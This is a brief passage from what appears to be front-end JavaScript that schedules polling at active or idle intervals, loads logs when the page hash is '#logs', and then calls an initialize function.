    schedulePoll(refreshing ? POLL_ACTIVE_MS : POLL_IDLE_MS);
    if (globalThis.location?.hash === "#logs") void loadLogs();
  }
}
initialize();
